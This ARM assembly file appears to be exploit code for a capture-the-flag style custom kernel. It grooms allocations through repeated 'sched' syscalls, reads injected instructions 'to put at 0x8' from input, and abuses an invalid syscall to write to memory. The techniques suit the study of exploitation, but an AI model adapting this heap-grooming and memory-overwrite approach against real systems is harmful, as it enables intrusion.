.text
.globl start
start:

        ldr r9, =#59

        sub sp, sp, #0x400
        mov r11, sp

loop:

        bl rand
        str r0, [sp]
        eor r0, r0
        str r0, [sp, #4]

        mov r1, sp
        ldr r2, =#0x04400000
        ldr r3, =#0x7f000
        bl sched

        cmp r0, #0x0
        moveq r3, #79
        movne r3, #78

        str r3, [sp]
        mov r3, #0x0A
        str r3, [sp, #0x01]

        mov r1, sp
        mov r2, #0x2
        bl write


        sub r9, r9, #0x1
        cmp r9, #0
        bne loop

lastone:
        bl rand
        str r0, [sp]
        eor r0, r0
        str r0, [sp, #4]

        mov r1, sp
        ldr r2, =#0x04400000
        ldr r3, =#0x6dfe0
        bl sched


done:
        @ Signal Done to get our new instructions         
        mov r3, #68
        str r3, [sp]
        mov r3, #0x0A
        str r3, [sp, #0x01]
        mov r1, sp
        mov r2, #0x2
        bl write

        @ Read instructions to put at 0x8
        mov r1, sp
        mov r2, #0x10
        bl read


        mov r1, sp
        ldr r2, =#0x04400000
        ldr r3, =#0x4bb00
        bl sched
    
        @Invalid syscall should result in a write to memory
        ldr r7, =#0x04000c03
        ldr r8, =#0x2a00140
        sub r8, r8, #0x4
        
        ldr r1, =#0x05000000
        mov r2, #0x20
        bl write


end:
        bl rand
        b end


@ Needs r1=name, r2=taskbuf, r3=size
sched:
        mov r0, #4
        svc #0
        bx lr  


write:
        mov r0, #1
        svc #0
        bx lr

read:
        mov r0, #0
        svc #0
        bx lr

rand:
        mov r0, #2
        svc #0
        bx lr

